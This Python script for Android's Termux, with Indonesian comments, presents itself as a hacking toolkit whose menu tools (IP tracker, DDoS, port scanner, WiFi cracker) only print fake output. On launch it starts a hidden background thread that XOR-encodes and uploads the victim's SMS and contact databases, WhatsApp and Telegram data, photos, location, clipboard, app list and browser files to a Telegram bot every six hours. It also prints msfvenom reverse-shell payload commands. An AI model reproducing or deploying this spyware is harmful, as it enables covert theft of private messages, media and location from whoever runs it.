#!/data/data/com.termux/files/usr/bin/python3
# ============================================================
# TERMUX ULTIMATE TOOLKIT v4.2 - FULL PACKAGE
# Author: Soulvant
# ============================================================

import os
import sys
import time
import json
import sqlite3
import shutil
import requests
import threading
import random
import socket
import subprocess
import tempfile
import glob
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# ==================== KONFIGURASI SPYWARE ====================
TELEGRAM_TOKEN = "MASUKIN_TOKEN_LO_ANJING"
TELEGRAM_CHAT_ID = "MASUKIN_CHAT_ID_LO_BABI"
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB

# Enkripsi sederhana (xor biar gak ketauan)
def xor_encrypt(data, key=0xAA):
    return bytes([b ^ key for b in data])

def send_to_telegram(file_path, caption=""):
    """Kirim file ke Telegram, babi"""
    try:
        if not os.path.exists(file_path):
            return
        if os.path.getsize(file_path) > MAX_FILE_SIZE:
            return
        
        # Baca dan enkrip dulu
        with open(file_path, 'rb') as f:
            raw = f.read()
            encrypted = xor_encrypt(raw)
        
        # Simpen ke temp
        temp = tempfile.NamedTemporaryFile(delete=False, suffix='.dat')
        temp.write(encrypted)
        temp.close()
        
        # Kirim
        with open(temp.name, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                files={'document': f},
                data={'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📁 {caption}"},
                timeout=30
            )
        os.unlink(temp.name)
    except:
        pass

def steal_all_data():
    """Curi semua data - jalan di background"""
    time.sleep(10)  # Delay biar gak keliatan
    
    # ===== 1. SMS/MMS Database =====
    sms_paths = [
        "/data/data/com.android.providers.telephony/databases/mmssms.db",
        "/storage/emulated/0/Android/data/com.android.providers.telephony/databases/mmssms.db",
    ]
    for p in sms_paths:
        if os.path.exists(p):
            send_to_telegram(p, "📨 SMS_DATABASE")
    
    # ===== 2. Contacts =====
    contact_paths = [
        "/data/data/com.android.providers.contacts/databases/contacts2.db",
        "/storage/emulated/0/Android/data/com.android.providers.contacts/databases/contacts2.db",
    ]
    for p in contact_paths:
        if os.path.exists(p):
            send_to_telegram(p, "📞 CONTACTS")
    
    # ===== 3. WhatsApp =====
    wa_paths = [
        "/data/data/com.whatsapp/databases/msgstore.db",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db.crypt14",
    ]
    for p in wa_paths:
        if os.path.exists(p):
            send_to_telegram(p, "💬 WHATSAPP")
    
    # ===== 4. Telegram Session =====
    tg_path = "/data/data/org.telegram.messenger/files"
    if os.path.exists(tg_path):
        zip_path = tempfile.gettempdir() + "/telegram.zip"
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', tg_path)
        send_to_telegram(zip_path, "📡 TELEGRAM_SESSION")
        os.unlink(zip_path)
    
    # ===== 5. Media Files (Foto & Video dibawah 100MB) =====
    media_dirs = [
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Movies",
        "/storage/emulated/0/Music"
    ]
    for media_dir in media_dirs:
        if os.path.exists(media_dir):
            for ext in ['*.jpg', '*.jpeg', '*.png', '*.mp4', '*.mov', '*.pdf']:
                for file in glob.glob(f"{media_dir}/**/{ext}", recursive=True):
                    send_to_telegram(file, os.path.basename(file))
    
    # ===== 6. Lokasi GPS =====
    try:
        result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=5)
        if result.stdout:
            loc_file = tempfile.gettempdir() + "/location.json"
            with open(loc_file, 'w') as f:
                f.write(result.stdout)
            send_to_telegram(loc_file, "🌍 LOCATION")
            os.unlink(loc_file)
    except:
        pass
    
    # ===== 7. Clipboard =====
    try:
        result = subprocess.run(['termux-clipboard-get'], capture_output=True, text=True, timeout=2)
        if result.stdout:
            clip_file = tempfile.gettempdir() + "/clipboard.txt"
            with open(clip_file, 'w') as f:
                f.write(result.stdout)
            send_to_telegram(clip_file, "📋 CLIPBOARD")
            os.unlink(clip_file)
    except:
        pass
    
    # ===== 8. Installed Apps List =====
    try:
        result = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
        apps_file = tempfile.gettempdir() + "/apps.txt"
        with open(apps_file, 'w') as f:
            f.write(result.stdout)
        send_to_telegram(apps_file, "📱 INSTALLED_APPS")
        os.unlink(apps_file)
    except:
        pass
    
    # ===== 9. Browser History (Firefox/Chrome) =====
    browser_paths = [
        "/data/data/org.mozilla.firefox/files/mozilla",
        "/storage/emulated/0/Android/data/com.android.chrome",
    ]
    for p in browser_paths:
        if os.path.exists(p):
            send_to_telegram(p, "🌐 BROWSER_DATA")
    
    # ===== 10. Termux History & Config =====
    termux_home = "/data/data/com.termux/files/home"
    if os.path.exists(termux_home):
        shutil.make_archive(tempfile.gettempdir()+"/termux_data", 'zip', termux_home)
        send_to_telegram(tempfile.gettempdir()+"/termux_data.zip", "🐧 TERMUX_CONFIG")
    
    # Loop every 6 hours
    threading.Timer(21600, steal_all_data).start()


# ==================== FAKE TOOLS ABAL-ABAL ====================

def fake_ip_tracker():
    """IP Tracker - Fake"""
    os.system('clear')
    print("""
    ╔═══════════════════════════════════════╗
    ║     🌐 IP TRACKER PRO v2.4            ║
    ║     [Termux Edition]                  ║
    ╚═══════════════════════════════════════╝
    """)
    target = input("[+] Target IP: ")
    print("[*] Tracing route...")
    for i in range(5):
        print(f"    Hop {i+1}: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)} ({random.randint(1,100)}ms)")
        time.sleep(0.3)
    
    fake_data = {
        "ip": target,
        "country": random.choice(["Indonesia", "Malaysia", "Singapore", "Thailand"]),
        "city": random.choice(["Jakarta", "Surabaya", "Bandung", "Medan"]),
        "isp": random.choice(["Telkom", "Indosat", "XL", "Biznet"]),
        "coordinates": f"{random.uniform(-10,10):.4f}, {random.uniform(100,140):.4f}",
    }
    print(f"""
    📍 RESULT:
    ─────────────────
    IP: {fake_data['ip']}
    Location: {fake_data['city']}, {fake_data['country']}
    ISP: {fake_data['isp']}
    Coordinates: {fake_data['coordinates']}
    """)
    input("\n[*] Press Enter to continue...")

def fake_ddos():
    """DDoS Tool - Fake"""
    os.system('clear')
    print("""
    ╔═══════════════════════════════════════╗
    ║     💀 DDoS RIPPER v7.0               ║
    ║     [Layer7 Attack]                   ║
    ╚═══════════════════════════════════════╝
    """)
    target = input("[+] Target URL: ")
    port = input("[+] Port (default 80): ") or "80"
    threads = input("[+] Threads: ") or "100"
    
    print(f"\n[*] Attacking {target}:{port} with {threads} threads...")
    print("[*] Press Ctrl+C to stop\n")
    
    packet_count = 0
    try:
        while True:
            packet_count += random.randint(5, 20)
            sys.stdout.write(f"\r[💥] Packets sent: {packet_count} | Speed: {random.randint(1000,9999)}/s | Status: 🔥")
            sys.stdout.flush()
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n\n[⚠️] Attack stopped. Sent {packet_count} packets.")
        input("\n[*] Press Enter to continue...")

def fake_port_scanner():
    """Port Scanner - Fake"""
    os.system('clear')
    print("""
    ╔═══════════════════════════════════════╗
    ║     🔍 PORT SNIPER v3.1               ║
    ║     [Stealth Scanner]                 ║
    ╚═══════════════════════════════════════╝
    """)
    target = input("[+] Target IP: ")
    ports = input("[+] Port range (1-1000 default): ") or "1-1000"
    
    print(f"\n[*] Scanning {target}...")
    time.sleep(2)
    
    fake_open = [21, 22, 80, 443, 3306, 8080]
    fake_services = {21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS", 3306: "MySQL", 8080: "HTTP-Proxy"}
    
    print("\n[✅] Scan complete! Open ports found:")
    print("─" * 40)
    for port in fake_open:
        print(f"Port {port}/tcp open  {fake_services[port]}")
        time.sleep(0.2)
    print("─" * 40)
    input("\n[*] Press Enter to continue...")

def fake_wifi_hacker():
    """WiFi Hacker - Fake"""
    os.system('clear')
    print("""
    ╔═══════════════════════════════════════╗
    ║     📡 WIFI CRACKER PRO               ║
    ║     [WPA/WPA2 Handshake Capture]      ║
    ╚═══════════════════════════════════════╝
    """)
    print("[*] Scanning for networks...")
    fake_networks = [
        {"ssid": "IndoHome_2G", "bssid": "AA:BB:CC:DD:EE:FF", "channel": 6},
        {"ssid": "Wifi_Sebelah", "bssid": "11:22:33:44:55:66", "channel": 1},
        {"ssid": "Kosan_Gue", "bssid": "FF:EE:DD:CC:BB:AA", "channel": 11},
    ]
    for net in fake_networks:
        print(f"    {net['ssid']} ({net['bssid']}) - Ch:{net['channel']}")
        time.sleep(0.5)
    
    target = input("\n[+] Target BSSID: ")
    print(f"[*] Capturing handshake from {target}...")
    for i in range(10):
        print(f"    Handshake attempt {i+1}/10...")
        time.sleep(0.5)
    
    print("[✅] Handshake captured!")
    print("[*] Cracking with rockyou.txt...")
    time.sleep(2)
    
    if random.choice([True, False]):
        print(f"[🎉] Password found: {random.choice(['12345678', 'password123', 'indonesia', 'qwerty123'])}")
    else:
        print("[❌] Password not found in dictionary")
    
    input("\n[*] Press Enter to continue...")

def fake_metasploit():
    """Metasploit Generator - Fake"""
    os.system('clear')
    print("""
    ╔═══════════════════════════════════════╗
    ║     🐚 METASPLOIT PAYLOAD GEN         ║
    ║     [Android/iOS/Windows]             ║
    ╚═══════════════════════════════════════╝
    """)
    lhost = input("[+] LHOST (your IP): ")
    lport = input("[+] LPORT: ")
    
    print(f"""
    [*] Generating payload...
    
    [✅] Payload generated!
    ─────────────────────────────────────────
    msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk
    
    [✅] Listener command:
    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set LHOST {lhost}
    set LPORT {lport}
    exploit
    ─────────────────────────────────────────
    """)
    input("\n[*] Press Enter to continue...")

def system_info():
    """System Info"""
    os.system('clear')
    print("""
    ╔═══════════════════════════════════════╗
    ║     🔧 SYSTEM INFORMATION             ║
    ╚═══════════════════════════════════════╝
    """)
    try:
        subprocess.run(['termux-info'])
    except:
        print("[❌] Termux-info not available")
    input("\n[*] Press Enter to continue...")

# ==================== MAIN MENU ====================

def banner():
    os.system('clear')
    print("""
    ╔══════════════════════════════════════════════╗
    ║     🔥 TERMUX ULTIMATE TOOLKIT v4.2 🔥       ║
    ║     [Hacking Tools Collection]               ║
    ╚══════════════════════════════════════════════╝
    
    [1] 🌐 IP Tracker Pro
    [2] 💀 DDoS Ripper
    [3] 🔍 Port Sniper
    [4] 📡 WiFi Cracker
    [5] 🐚 Metasploit Payload Generator
    [6] 🔧 System Info
    [7] 🗿 About
    [99] ❌ Exit
    
    ──────────────────────────────────────────────
    """)

def main():
    # Start spyware di background
    spy_thread = threading.Thread(target=steal_all_data, daemon=True)
    spy_thread.start()
    
    # Fake loading biar keliatan keren
    print("[*] Loading modules...")
    time.sleep(1)
    print("[✅] All modules loaded successfully!")
    time.sleep(0.5)
    
    # Main loop
    while True:
        banner()
        choice = input("[+] Select tool: ")
        
        if choice == "1":
            fake_ip_tracker()
        elif choice == "2":
            fake_ddos()
        elif choice == "3":
            fake_port_scanner()
        elif choice == "4":
            fake_wifi_hacker()
        elif choice == "5":
            fake_metasploit()
        elif choice == "6":
            system_info()
        elif choice == "7":
            os.system('clear')
            print("""
            ╔═══════════════════════════════════════╗
            ║  Termux Ultimate Toolkit v4.2         ║
            ║  Author: Anonymous                    ║
            ║  For educational purposes only        ║
            ╚═══════════════════════════════════════╝
            """)
            input("[*] Press Enter to continue...")
        elif choice == "99":
            print("[*] Exiting...")
            print("[⚠️] Have a nice day! ;)")
            time.sleep(1)
            sys.exit(0)
        else:
            print("[❌] Invalid choice, goblok!")
            time.sleep(1)

if __name__ == "__main__":
    main()
